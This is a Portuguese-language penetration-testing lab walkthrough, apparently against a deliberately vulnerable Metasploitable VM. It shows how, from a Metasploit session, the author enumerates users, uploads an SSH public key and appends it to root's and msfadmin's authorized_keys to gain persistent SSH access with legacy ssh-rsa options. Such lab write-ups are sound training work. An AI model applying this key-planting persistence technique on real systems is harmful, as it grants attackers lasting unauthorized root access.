# 03. Ganhando acesso direto ao SSH

Após realizar a etapa de exploração de vulnerabilidade de um dos serviços presentes na nossa máquina alvo (leia <a href="/steps/03_ganhando_acesso_direto_ao_ssh.md">03. Ganhando acesso direto ao <b>SSH</b></a> para entender o fluxo de pensamento até aqui), vamos procurar uma conexão ao <i><b>console/terminal</b></i> da máquina mais estável, nos conectando diretamente ao <i><b>SSH da mesma.</b></i>

Após a gente conseguir acesso ao <i><b>console</b></i> da máquina, vamos procurar por mais usuários nos quais podemos realizar o acesso via <i><b>SSH</b></i>:

```
ls /home
ftp
msfadmin
service
user
```

<b>Aparentemente</b>, além do usuário `root`, temos os usuários `ftp`, `msfadmin`, `service` e `user`.

Antes de qualquer coisa, vamos criar uma chave ssh para usarmos somente nesse cenário (<i>por segurança, alguns dados foram editados</i>):

```
$ ssh-keygen -t rsa -b 4096 -C "local@pentest"
Generating public/private rsa key pair.
Enter file in which to save the key (/home/user/.ssh/id_rsa): local_pentest
Enter passphrase for "local_pentest" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in local_pentest
Your public key has been saved in local_pentest.pub
The key fingerprint is:
SHA256:97DsZKl2Q39fDWb1Fucxo3t9/q9c5epgRIG2zO7Sdyo local@pentest
The key's randomart image is:
+---[RSA 4096]----+
|           ..    |
|          o  .   |
|         + ..  =o|
|          +.  .oB|
|        S.o ..+ =|
|         oo* o.++|
|         +*.+. .B|
|        o=E.oo++o|
|       ..o.+.==oB|
+----[SHA256]-----+
```

Chave ssh criada com sucesso. Vamos voltar a sessão que a gente fez no <i><b>Metasploit</b></i> e vamos importar essa chave (a parte pública) para dentro da nossa máquina alvo:

```
upload .ssh/local_pentest.pub /tmp/local_pentest.pub
[*] Max line length is 65537
[*] Writing 750 bytes in 1 chunks of 2853 bytes (octal-encoded), using printf
[+] File </tmp/local_pentest.pub> upload finished
chmod 600 /tmp/local_pentest.pub
```

Vamos averiguar quais desses usuários a gente pode realmente habilitar o acesso ssh com a nossa chave:

```
ls -a /root
.
..
.Xauthority
.bash_history
.bashrc
.config
.filezilla
.fluxbox
.gconf
.gconfd
.gstreamer-0.10
.mozilla
.profile
.purple
.rhosts
.ssh
.vnc
Desktop
reset_logs.sh
vnc.log
ls /home
ftp
msfadmin
service
user
ls -a /home/ftp
.
..
ls -a /home/msfadmin
.
..
.bash_history
.distcc
.gconf
.gconfd
.mysql_history
.profile
.rhosts
.ssh
.sudo_as_admin_successful
server_dump_mysql.sql
server_dump_postgres.sql
vulnerable
ls -a /home/service
.
..
.bash_logout
.bashrc
.profile
ls -a /home/user
.
..
.bash_history
.bash_logout
.bashrc
.profile
.ssh
```

Somente os usuários `root`, `msfadmin` e `user` possuem diretórios `.ssh`, então vamos copiar nossa chave para esses usuários:

```
cp /tmp/local_pentest.pub /root/.ssh/local_pentest.pub
cp /tmp/local_pentest.pub /home/msfadmin/.ssh/local_pentest.pub
cp /tmp/local_pentest.pub /home/user/.ssh/local_pentest.pub
```

Tentamos acessar agora o SSH com algum dos usuários com o comando:

`$ ssh msfadmin@192.168.56.102`

Sem sucesso, o SSH não chega nem a retornar nada. Vamos ativar a verbosidade do SSH do cliente para tentar ver o que está acontecendo:

```
$ ssh msfadmin@192.168.56.105 -v
debug1: OpenSSH_10.0p2 Debian-8, OpenSSL 3.5.3 16 Sep 2025
debug1: Reading configuration data /home/pqpmath3ws/.ssh/config
debug1: /home/pqpmath3ws/.ssh/config line 1: Applying options for *
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Reading configuration data /etc/ssh/ssh_config.d/20-systemd-ssh-proxy.conf
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 192.168.56.105 [192.168.56.105] port 22.
debug1: Connection established.
debug1: identity file /home/pqpmath3ws/.ssh/id_rsa type 0
debug1: identity file /home/pqpmath3ws/.ssh/id_rsa-cert type -1
debug1: identity file /home/pqpmath3ws/.ssh/id_ecdsa type -1
debug1: identity file /home/pqpmath3ws/.ssh/id_ecdsa-cert type -1
debug1: identity file /home/pqpmath3ws/.ssh/id_ecdsa_sk type -1
debug1: identity file /home/pqpmath3ws/.ssh/id_ecdsa_sk-cert type -1
debug1: identity file /home/pqpmath3ws/.ssh/id_ed25519 type 3
debug1: identity file /home/pqpmath3ws/.ssh/id_ed25519-cert type -1
debug1: identity file /home/pqpmath3ws/.ssh/id_ed25519_sk type -1
debug1: identity file /home/pqpmath3ws/.ssh/id_ed25519_sk-cert type -1
debug1: identity file /home/pqpmath3ws/.ssh/id_xmss type -1
debug1: identity file /home/pqpmath3ws/.ssh/id_xmss-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_10.0p2 Debian-8
debug1: Remote protocol version 2.0, remote software version OpenSSH_4.7p1 Debian-8ubuntu1
debug1: compat_banner: match: OpenSSH_4.7p1 Debian-8ubuntu1 pat OpenSSH_2*,OpenSSH_3*,OpenSSH_4* compat 0x00000002
debug1: Authenticating to 192.168.56.105:22 as 'msfadmin'
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: diffie-hellman-group-exchange-sha256
debug1: kex: host key algorithm: (no match)
Unable to negotiate with 192.168.56.105 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

Ah, agora conseguimos entender o problema que estamos tendo aqui: O servidor roda uma versão muito antiga do OpenSSH <i>(4.7.1p)</i> e usa dois formatos que já foram desabilitados por padrão no OpenSSH mais atual (<i><b>ssh-rsa</b></i> e <i><b>ssh-dss</b></i>). Como conseguir o acesso agora, sem mexer na máquina alvo? Simples - passemos uma configuração extra na linha de comando para permitir a conexão a esses modos mais antigos e descontinuados. Para nos conectarmos, precisaremos passar mais alguns argumentos, ficando assim o comando:

`ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.56.105`

onde,

- `-o HostKeyAlgorithms=+ssh-rsa` adiciona a opção `HostKeyAlgorithms` com o valor do padrão do ssh do server - `ssh-rsa`
- `-o PubkeyAcceptedKeyTypes=+ssh-rsa` adiciona a opção  `PubkeyAcceptedKeyTypes` com o valor do padrão ssh do server `ssh-rsa`.

Tentamos nos conectar, e mais uma vez, falhamos, só que agora o servidor pede uma senha (que a gente ainda não tem). O que vamos fazer?

Vamos procurar pela existência de um arquivo chamado <i><b>authorized_keys</b></i> nos usuários da nossa máquina alvo, pelo <i><b>Metasploit</b></i>:

```
ls -a /root/.ssh/
.
..
authorized_keys
known_hosts
local_pentest.pub
ls -a /home/msfadmin/.ssh/
.
..
authorized_keys
id_rsa
id_rsa.pub
local_pentest.pub
ls /home/user/.ssh/
id_dsa
id_dsa.pub
local_pentest.pub
```

Somente os usuários `root` e `msfadmin` possuem tal arquivo. Vamos copiar o valor da chave pública pra dentro desses arquivos agora:

```
cat /tmp/local_pentest.pub >> /root/.ssh/authorized_keys
cat /tmp/local_pentest.pub >> /home/msfadmin/.ssh/authorized_keys
```

Executamos o mesmo comando novamente:

`ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.56.105`

E <b>VOALÀ!</b> - Acesso SSH garantido ao nosso servidor alvo. Agora o céu é o limite. E vamos com tudo para nossa próxima etapa!